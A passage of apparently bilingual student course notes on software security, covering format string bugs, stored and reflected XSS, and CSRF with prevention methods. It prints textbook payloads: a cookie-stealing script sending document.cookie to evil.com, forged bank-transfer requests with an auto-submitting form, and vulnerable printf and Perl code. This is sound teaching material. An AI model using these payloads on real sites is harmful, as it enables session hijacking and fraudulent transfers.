amount of data written with length parameter\n<ul>\n<li><code>printf(&quot;%10d%hn&quot;, 0, &amp;num_char);</code></li>\n<li>Writes 2 bytes (instead of 4 bytes) to  <code>&amp;num_char</code></li>\n</ul>\n</li>\n<li>Combined with the trick to access arbitrary memory locations, the attacker can write to arbitrary memory locations</li>\n</ul>\n<ol start=\"4\">\n<li>Example</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"type\">char</span> buf[<span class=\"number\">512</span>]; </span><br><span class=\"line\">     fgets(buf, <span class=\"keyword\">sizeof</span>(buf), <span class=\"built_in\">stdin</span>); <span class=\"comment\">// 安全读取输入，不会导致缓冲区溢出</span></span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;The input is:&quot;</span>); </span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(buf);  <span class=\"comment\">// 存在格式化字符串漏洞</span></span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"> &#125; </span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>printf(buf);</code>  直接使用了用户输入的内容作为格式化字符串。如果  <code>buf</code>  中包含格式化占位符（如  <code>%s</code> 、 <code>%x</code> 、 <code>%n</code>  等）， <code>printf()</code>  会将其解释为格式化指令，从而造成安全隐患。</li>\n<li>修复：  <code>printf(&quot;The input is: %s&quot;, buf);</code> ：% s 确保输入内容被当作普通字符串处理，而不是格式化字符串</li>\n</ul>\n<h1 id=\"Denial of Service Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Denial of Service Attacks\">#</a>Denial of Service Attacks</h1>\n<ul>\n<li>\n<p>Crash the program by attempting to access an invalid address</p>\n<ul>\n<li>Use  <code>%s</code>  to retrieve a value from the stack till encountering an invalid memory location</li>\n</ul>\n</li>\n<li>\n<p>The exploit string would look something like this</p>\n<ul>\n<li>·printf(&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;);·</li>\n</ul>\n</li>\n<li>\n<p>The more %s used in the format string, the higher the chance of an invalid address</p>\n</li>\n</ul>\n<h1 id=\"Format String Attacks Prevention\" class=\"active\"><a class=\"anchor\"  href=\"#Format String Attacks Prevention\">#</a>Format String Attacks Prevention</h1>\n<ol>\n<li>Hard-coded format strings (e.g. no  <code>printf(arg)</code> )</li>\n<li>Do not use the fancy  <code>%n</code></li>\n<li>Be careful with pass as references</li>\n</ol>\n<ul>\n<li>e.g.  <code>%s</code>  and  <code>sprintf</code>  can be used to create disclosure attacks</li>\n</ul>\n<ol start=\"4\">\n<li>Compiler support to match  <code>printf</code>  arguments with format string</li>\n</ol>\n<ul>\n<li>e.g. the  <code>gcc</code>  compiler provides options to check format strings</li>\n</ul>\n","categories":["课程笔记","Principles of Software Security"],"tags":["C","software security","vulnerability"]},{"title":"Cross-Site attack","url":"/course/Cross-Site-attack/","content":"<h1 id=\"Cross-Site Scripting\" class=\"active\"><a class=\"anchor\"  href=\"#Cross-Site Scripting\">#</a>Cross-Site Scripting</h1>\n<h2 id=\"XSS\" class=\"active\"><a class=\"anchor\"  href=\"#XSS\">#</a>XSS</h2>\n<ol>\n<li>Cross-Site Scripting (XSS)</li>\n</ol>\n<ul>\n<li>Causes arbitrary code to run in a browser that is connected to a trusted Web site\n<ul>\n<li>May occur when code returns HTML output that makes use of user inputs</li>\n<li>Trick users into clicking a hyperlink from outside the site</li>\n</ul>\n</li>\n<li>Attacks allows:\n<ul>\n<li>Disclosure of user files</li>\n<li>Installation of Trojans</li>\n<li>Redirection to other pages</li>\n<li>Trivial theft of cookies</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Basic Problem: Echoing Untrusted User Input<br>\nClassic mistake in a server-side application with URL  <code>http://naive.com/search.php?term=justin+bieber</code> <br>\nPHP at search.php responds with</li>\n</ol>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;&lt;title&gt;Search results&lt;/title&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">   You have searched for </span><br><span class=\"line\">   &lt;?php echo $_GET[&#x27;term&#x27;] ?&gt; </span><br><span class=\"line\">   ...  </span><br><span class=\"line\"> &lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>在这里， <code>$_GET['term']</code>  的内容直接被嵌入到 HTML 中进行回显。如果  <code>$_GET['term']</code>  包含恶意的 HTML 或 JavaScript 代码，则可能引发跨站脚本攻击 (XSS)。</p>\n<ol start=\"3\">\n<li>Dangerous HTML Inputs</li>\n</ol>\n<ul>\n<li><code>&lt;script&gt;alert(&quot;Boo!&quot;)&lt;/script&gt;</code> <br>\n 此代码弹出一个警告对话框，证明 XSS 攻击是可能的。</li>\n<li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code> <br>\n 此代码会打印当前页面的 Cookie 信息，攻击者可能会窃取用户的会话 Cookie，从而劫持会话。</li>\n<li><code>&lt;script&gt;document.write(&quot;&lt;br&gt;&quot;)&lt;/script&gt;</code> <br>\n 此代码会在页面中添加一个  <code>&lt;br&gt;</code>  标签，显示攻击者可以更改网页内容。</li>\n<li><code>&lt;script&gt;window.location='http://google.com'&lt;/script&gt;</code> <br>\n 此代码会将当前网页重定向到另一个页面，使得攻击者可以将用户导向恶意站点</li>\n</ul>\n<ol start=\"4\">\n<li>Main Types of Cross-Site Scripting Attacks\n<ol>\n<li>Stored (persistent)</li>\n<li>Reflected (non-persistent)</li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Stored (Persistent) XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Stored (Persistent) XSS Attacks\">#</a>Stored (Persistent) XSS Attacks</h2>\n<ol>\n<li>Data supplied by an attacker is <strong>permanently stored</strong> on a server and displayed to other users when browsing without being properly sanitised<br>\nIf the user input is displayed in the page\n<ul>\n<li>HTML tags can mess up the look of the page</li>\n<li>JavaScript can steal information or cause more advanced malicious behaviour</li>\n<li>For the current user or other users<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/67222f628055d.png\" alt=\"img\"></li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight perl\"><figcaption><span>Example Vulnerable Guestbook Program</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!perl</span></span><br><span class=\"line\"> <span class=\"comment\"># Fig. 19.6: fig19_06.pl</span></span><br><span class=\"line\"> <span class=\"comment\"># Guestbook program.</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">use</span> warnings;</span><br><span class=\"line\"> <span class=\"keyword\">use</span> strict;</span><br><span class=\"line\"> <span class=\"keyword\">use</span> CGI <span class=\"string\">qw( :standard )</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span>( header(), start_html( <span class=\"string\">&quot;Guestbook&quot;</span> ), h1( <span class=\"string\">&quot;Guestbook&quot;</span> ));</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> ( param() ) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">print</span> h3( <span class=\"string\">&quot;Thank you for signing our guestbook!!!&quot;</span> ),</span><br><span class=\"line\">   </span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$name</span> = param( <span class=\"string\">&quot;name&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$email</span> = param( <span class=\"string\">&quot;email&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">my</span> <span class=\"variable\">$message</span> = param( <span class=\"string\">&quot;message&quot;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">open</span>( FILE, <span class=\"string\">&quot;&gt;&gt;guestbook.log&quot;</span> ) <span class=\"keyword\">or</span>   //Open the guestbook file</span><br><span class=\"line\">       <span class=\"keyword\">die</span>( <span class=\"string\">&quot;Cannot open guestbook&quot;</span> );</span><br><span class=\"line\">    <span class=\"keyword\">print</span>( FILE, <span class=\"string\">&quot;\\n&quot;</span>, hr(), <span class=\"string\">&quot;From: &quot;</span>, </span><br><span class=\"line\">       a( &#123; <span class=\"string\">-href =&gt;</span> <span class=\"string\">&quot;mailto:<span class=\"variable\">$email</span>&quot;</span> &#125;, <span class=\"variable\">$name</span> ), br(), br(),</span><br><span class=\"line\">       <span class=\"variable\">$message</span> );    <span class=\"regexp\">//</span> Store the user entered data in the guestbook file</span><br><span class=\"line\">    <span class=\"keyword\">close</span>( FILE );</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">open</span>( FILE, <span class=\"string\">&quot;guestbook.log&quot;</span>) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&quot;Cannot open guestbook&quot;</span> );   <span class=\"regexp\">//</span>Open the guestbook file</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span> <span class=\"keyword\">while</span> ( &lt;FILE&gt; );      <span class=\"regexp\">//</span>Display the contents of the guestbook file</span><br><span class=\"line\"> <span class=\"keyword\">close</span>( FILE );</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">print</span>( h4( <span class=\"string\">&quot;Please sign our guestbook:&quot;</span> ), start_form(),</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"string\">&quot;Name: &quot;</span>, textfield( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;name&quot;</span> ), br(),</span><br><span class=\"line\">     <span class=\"string\">&quot;E-mail: &quot;</span>, textfield( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;email&quot;</span> ), br(),</span><br><span class=\"line\">     <span class=\"string\">&quot;Enter your message:&quot;</span>, br(),</span><br><span class=\"line\">     textarea( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;message&quot;</span>, <span class=\"string\">-rows =&gt;</span> <span class=\"number\">5</span>, <span class=\"string\">-columns =&gt;</span> <span class=\"number\">50</span>, <span class=\"string\">-wrap =&gt;</span> <span class=\"number\">1</span> ),</span><br><span class=\"line\">     br(), submit( <span class=\"string\">-name =&gt;</span> <span class=\"string\">&quot;Sign the Guestbook&quot;</span> ), end_form(),</span><br><span class=\"line\"></span><br><span class=\"line\">     end_html() );</span><br></pre></td></tr></table></figure>\n<p>该 Perl 脚本是一个基本的访客留言簿程序，允许用户输入姓名、电子邮件和消息并将其保存到日志文件 (guestbook.log) 中。程序还可以读取并显示日志文件的内容</p>\n<ul>\n<li>用户输入未过滤：程序直接使用用户输入来生成 HTML 输出和写入日志文件，没有进行任何过滤或转义，容易导致跨站脚本攻击（XSS）。\n<ul>\n<li>例如，用户在  <code>name</code>  或  <code>message</code>  输入字段中插入  <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> ，这段恶意代码将会在其他用户查看留言簿时被执行。</li>\n<li>或是在留言时插入 HTML 改变页面布局</li>\n</ul>\n</li>\n<li>日志文件的可写性：<br>\n程序将用户的输入附加到日志文件 guestbook.log，但没有验证文件是否存在或是否已被修改，可能会导致文件篡改或覆盖攻击。<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/6722340e28890.png\" alt=\"img\"></li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><img data-src=\"https://img.picui.cn/free/2024/10/30/6722340ddbbb1.png\" alt=\"Image 1\"></th>\n<th style=\"text-align:center\"><img data-src=\"https://img.picui.cn/free/2024/10/30/6722340b9e2cd.png\" alt=\"Image 2\"></th>\n</tr>\n</thead>\n</table>\n<h2 id=\"Reflected (Non-Persistent) XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Reflected (Non-Persistent) XSS Attacks\">#</a>Reflected (Non-Persistent) XSS Attacks</h2>\n<ol>\n<li>Data supplied by an attacker is displayed in the response page <strong>without being stored on a server</strong><br>\nIf the user input is displayed in the page\n<ul>\n<li>HTML tags can mess up the look of the page</li>\n<li>JavaScript can steal information or cause more advanced malicious behaviour</li>\n<li>For only the current user</li>\n</ul>\n</li>\n<li>Example<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/30/672236eb773d1.png\" alt=\"img\"></li>\n</ol>\n<ul>\n<li>恶意网页（<span class=\"exturl\" data-url=\"aHR0cDovL2V2aWwuY29t\">evil.com</span>）<br>\n攻击者在  <code>evil.com</code>  上创建了一个包含恶意代码的网页。<br>\n页面中包含了一个指向目标网站的链接或表单，其中含有恶意的 JavaScript 代码。例如：</li>\n</ul>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://naive.com/hello.cgi?name=&lt;script&gt;win.open(&#x27;http://evil.com/steal.cgi?cookie=&#x27; + document.cookie)&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>链接中的  <code>name</code>  参数是用来注入 JavaScript 代码的。代码试图将用户的  <code>cookie</code>  信息发送到攻击者的服务器（即  <code>evil.com</code>  的  <code>steal.cgi</code>  脚本）。</p>\n<ul>\n<li>受害者点击了恶意链接并访问了目标网页。<br>\n浏览器向 <span class=\"exturl\" data-url=\"aHR0cDovL25haXZlLmNvbQ==\">naive.com</span> 发送请求，其中包含了恶意的 name 参数。请求的样式为：</li>\n</ul>\n<figure class=\"highlight javascript\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> /hello.<span class=\"property\">cgi</span>?name=<span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">win.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>目标网站（<span class=\"exturl\" data-url=\"aHR0cDovL25haXZlLmNvbQ==\">naive.com</span>）<br>\n目标网站 <span class=\"exturl\" data-url=\"aHR0cDovL25haXZlLmNvbQ==\">naive.com</span> 将用户输入的 name 参数原封不动地嵌入到了响应的 HTML 页面中。响应页面可能是这样：</li>\n</ul>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">HTML</span>&gt;</span>Hello, dear </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\">win.<span class=\"title function_\">open</span>(<span class=\"string\">&#x27;http://evil.com/steal.cgi?cookie=&#x27;</span> + <span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>)</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>. Welcome!<span class=\"tag\">&lt;/<span class=\"name\">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>由于未对输入进行过滤，浏览器将  <code>script</code>  标签作为普通的 JavaScript 代码执行。</p>\n<ul>\n<li>结果\n<ul>\n<li>浏览器执行了恶意 JavaScript 代码，打开了一个新的窗口并向  <code>evil.com/steal.cgi</code>  发送了用户的  <code>cookie</code>  信息。</li>\n<li>攻击者通过这种方式获取了受害者的敏感信息（例如身份验证 cookie），并可能进一步进行会话劫持。</li>\n<li>违反同源策略（SOP）：同源策略（Same-Origin Policy）旨在保护用户的浏览器不被恶意脚本跨站攻击，XSS 攻击直接违反了这一策略</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Reflected XSS Attack Details</li>\n</ol>\n<ul>\n<li>User is tricked into visiting an honest website</li>\n<li>Bug in website code causes user’s browser to execute an arbitrary attack script\n<ul>\n<li>The origin of this script is now the website itself</li>\n</ul>\n</li>\n<li>Script can request sensitive data, control form fields on this page and linked pages\n<ul>\n<li>Can cause user’s browser to attack other websites<br>\nExample: <span class=\"exturl\" data-url=\"aHR0cDovL015U3BhY2UuY29t\">MySpace.com</span> phishing attack injects a fake password field that sends password to attacker</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Stored XSS VS Reflected XSS\" class=\"active\"><a class=\"anchor\"  href=\"#Stored XSS VS Reflected XSS\">#</a>Stored XSS VS Reflected XSS</h2>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>存储型 XSS (Stored XSS)</th>\n<th>反射型 XSS (Reflected XSS)</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>代码存储</td>\n<td>服务器端持久存储</td>\n<td>仅在请求中反射</td>\n</tr>\n<tr>\n<td>持久性</td>\n<td>持久性，影响更多用户</td>\n<td>非持久性，通常只影响特定用户</td>\n</tr>\n<tr>\n<td>攻击手段</td>\n<td>利用持久存储（如数据库、日志、文件等）</td>\n<td>通过恶意链接或表单提交诱导用户</td>\n</tr>\n<tr>\n<td>示例场景</td>\n<td>评论区、论坛帖子、博客文章、用户简介等</td>\n<td>钓鱼邮件、恶意链接、搜索查询等</td>\n</tr>\n<tr>\n<td>修复难度</td>\n<td>难度较大，需清理服务器上的恶意代码</td>\n<td>难度较小，可通过输入验证和转义快速修复</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"Preventing XSS Attacks\" class=\"active\"><a class=\"anchor\"  href=\"#Preventing XSS Attacks\">#</a>Preventing XSS Attacks</h2>\n<ol>\n<li>Input Filtering<br>\n 还没懂先放个链接在这<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9YU1NfRmlsdGVyX0V2YXNpb25fQ2hlYXRfU2hlZXQuaHRtbA==\"> XSS Filter Evasion Cheat Sheet</span></li>\n<li>Framework validation</li>\n<li>Output Sanitisation</li>\n</ol>\n<ul>\n<li>Any user input and client-side data must be preprocessed before it is used inside HTML\n<ul>\n<li>PHP:  <code>htmlspecialchars(string)</code>  replaces all special characters with their HTML code 例如，将  <code>&lt;</code>  转换为  <code>&amp;lt;</code> ， <code>&gt;</code>  转换为  <code>&amp;gt;</code> ，以防止这些字符被浏览器解释为 HTML 或脚本标签。</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL0FTUC5ORVQ=\">ASP.NET</span>:  <code>Server.HtmlEncode(string)</code>  该方法会将字符串中的特殊字符转换为 HTML 实体，确保浏览器不会将其解释为可执行代码。</li>\n</ul>\n</li>\n<li>过滤可能会将输入转换成攻击形式\n<ul>\n<li>如果预处理过程中未彻底消除所有潜在威胁，有可能仍会导致 XSS 等攻击。</li>\n<li>需要在过滤后多次循环检查，并在检测到恶意内容时重新应用过滤，直到不再发现潜在威胁为止。</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Cross-Site Request Forgery\" class=\"active\"><a class=\"anchor\"  href=\"#Cross-Site Request Forgery\">#</a>Cross-Site Request Forgery</h1>\n<h2 id=\"CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#CSRF\">#</a>CSRF</h2>\n<ol>\n<li>Cross-Site Request Forgery (CSRF)</li>\n</ol>\n<ul>\n<li>A privileged user is tricked to perform an operation on the behalf of an attacker\n<ul>\n<li>Often through social engineering (such as sending a link via email or chat)</li>\n</ul>\n</li>\n<li>Usually unnoticed by the victim user\n<ul>\n<li>Requests are sent by the browser behind the scenes</li>\n</ul>\n</li>\n<li>CSRF exploits the trust that a web site has in a user’s browser\n<ul>\n<li>XSS exploits the trust a user has for a particular site</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Characteristics of CSRF</li>\n</ol>\n<ul>\n<li>Web sites rely on a user’s identity</li>\n<li>The site has trust in that identity</li>\n<li>The user’s browser is tricked into sending HTTP requests to a target site</li>\n<li>Such HTTP requests have side effects\n<ul>\n<li>Because the attacker doesn’t receive the response</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Example\" class=\"active\"><a class=\"anchor\"  href=\"#Example\">#</a>Example</h2>\nExample Description：\nAlice wishes to transfer $100 to Bob using the bank.com web application that is vulnerable to CSRF. Charlie, an attacker, wants to trick Alice into sending the money to Charlie instead. The attack will comprise the following steps: \n<ul>\n<li>Build an exploit URL or script</li>\n<li>Trick Alice into executing the action with social engineering</li>\n</ul>\n<ol>\n<li>Example: GET<br>\nA GET request from Alice to transfer money to Bob</li>\n</ol>\n<figure class=\"highlight ruby\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> <span class=\"symbol\">http:</span>/<span class=\"regexp\">/bank.com/transfer</span>.<span class=\"keyword\">do</span>?acct=<span class=\"variable constant_\">BOB</span>&amp;amount=<span class=\"number\">100</span> <span class=\"variable constant_\">HTTP</span>/<span class=\"number\">1.1</span></span><br></pre></td></tr></table></figure>\n<p>Charlie first forges the following exploit URL</p>\n<figure class=\"highlight ruby\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">http:</span>/<span class=\"regexp\">/bank.com/transfer</span>.<span class=\"keyword\">do</span>?acct=<span class=\"variable constant_\">CHARLIE</span>&amp;amount=<span class=\"number\">100000</span></span><br></pre></td></tr></table></figure>\n<p>Then, Charlie tricks Alice into loading this URL <strong>when Alice is logged into the bank</strong> 例如通过发送恶意电子邮件或在其他网站上种植恶意链接。</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span>&gt;</span>查看我的图片！<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>或</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&quot;</span> <span class=\"attr\">width</span>=<span class=\"string\">&quot;0&quot;</span> <span class=\"attr\">height</span>=<span class=\"string\">&quot;0&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>Example: POST<br>\nA POST request from Alice to transfer money to Bob</li>\n</ol>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">POST</span> <span class=\"string\">http://bank.com/transfer.do</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"> acct=BOB&amp;amount=100</span><br></pre></td></tr></table></figure>\n<p>Charlie first crafts some hidden FORM tags</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">&quot;http://bank.com/transfer.do&quot;</span> <span class=\"attr\">method</span>=<span class=\"string\">&quot;POST&quot;</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;acct&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;CHARLIE&quot;</span>/&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;hidden&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;amount&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;100000&quot;</span>/&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;submit&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;查看我的图片！&quot;</span>/&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>Then, Charlie tricks Alice to click on the submit button<br>\nCan also be executed automatically using JavaScript</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">onload</span>=<span class=\"string\">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>Example: Other HTTP Methods<br>\nCharlie can use HTTP PUT method that takes a JSON object as an argument</li>\n</ol>\n<figure class=\"highlight http\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">PUT</span> <span class=\"string\">http://bank.com/transfer.do</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   &quot;acct&quot;: &quot;CHARLIE&quot;,</span><br><span class=\"line\">   &quot;amount&quot;: 100000</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>Such requests can be executed with JavaScript</p>\n<figure class=\"highlight html\"><figcaption><span>OvO</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">  <span class=\"keyword\">function</span> <span class=\"title function_\">put</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">    <span class=\"keyword\">var</span> x = <span class=\"keyword\">new</span> <span class=\"title class_\">XMLHttpRequest</span>();</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">open</span>(<span class=\"string\">&quot;PUT&quot;</span>, <span class=\"string\">&quot;http://bank.com/transfer.do&quot;</span>, <span class=\"literal\">true</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">setRequestHeader</span>(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;application/json&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\">    x.<span class=\"title function_\">send</span>(<span class=\"title class_\">JSON</span>.<span class=\"title function_\">stringify</span>(&#123;<span class=\"string\">&quot;acct&quot;</span>: <span class=\"string\">&quot;CHARLIE&quot;</span>, <span class=\"string\">&quot;amount&quot;</span>: <span class=\"number\">100000</span>&#125;));</span></span><br><span class=\"line\"><span class=\"language-javascript\">  &#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"> </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"Prevention CSRF\" class=\"active\"><a class=\"anchor\"  href=\"#Prevention CSRF\">#</a>Prevention CSRF</h2>\n<ol>\n<li>Prevention Methods That Do Not Work\n<ol>\n<li>使用 “秘密” Cookie  (Using a secret cookie) ：在请求中加入一个 “秘密” Cookie，用来验证请求的合法性。<br>\n所有 Cookie 都会在每个请求中被自动发送，无论是合法请求还是伪造请求。因此，攻击者可以利用受害者的浏览器自动发送这些 Cookie。</li>\n<li>仅接受 POST 请求 (Only accepting POST requests) ：限制仅接受 POST 请求来提交敏感操作的数据。<br>\n攻击者仍然可以通过 HTML 表单、AJAX 请求或自动提交脚本，诱导受害者提交伪造的 POST 请求。因此，仅使用 POST 请求并不能完全防止 CSRF。</li>\n<li>多步事务处理 (Multi-step transactions) ：将操作分解为多个步骤，并在每一步中进行用户确认。：<br>\n攻击者可能通过观察或猜测，预测每一步的结果，并模拟完整的事务流程。如果没有额外的保护机制（如 CSRF 令牌），多步流程仍然易受 CSRF 攻击。</li>\n<li>URL 重写 (URL Rewriting)： 在 URL 中包含用户的会话 ID 以维护状态。<br>\n将会话 ID 暴露在 URL 中，会增加被截获或泄露的风险。攻击者可能会通过网络流量分析、代理日志、浏览器历史记录等方式获取会话 ID。</li>\n<li>HTTPS：使用 HTTPS 来加密通信内容。<br>\nHTTPS 只能加密传输的内容，不能防止伪造的请求。攻击者仍可以通过受害者的浏览器发送有效的 CSRF 攻击请求，哪怕是 HTTPS 加密的请求。</li>\n</ol>\n</li>\n<li>Prevent CSRF: Token-based mitigation</li>\n</ol>\n<ul>\n<li>A CSRF token is a unique, secret, unpredictable value\n<ul>\n<li>Generated by web applications and included on their own web pages<br>\n <code>http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&amp;token=31415926535</code></li>\n</ul>\n</li>\n<li>Web applications reject requests if the token is missing or invalid\n<ul>\n<li>Impossible for an attacker to guess the token and construct a fully valid HTTP request</li>\n</ul>\n</li>\n<li>Types of CSRF tokens\n<ul>\n<li>Synchroniser token 同步令牌：\n<ul>\n<li>服务端为每个会话生成一个唯一的令牌，并在请求中验证该令牌。</li>\n<li>典型的做法是在表单中嵌入一个隐藏字段，或在 URL 中附加该令牌。</li>\n<li>缺点是需要在服务端保存和管理令牌。</li>\n</ul>\n</li>\n<li>encryption-based token 加密令牌：\n<ul>\n<li>使用加密算法将用户信息和时间戳加密，生成唯一的令牌。</li>\n<li>这种令牌不需要服务端存储，因为它可以通过解密来验证请求的有效性。</li>\n</ul>\n</li>\n<li>hash-based token 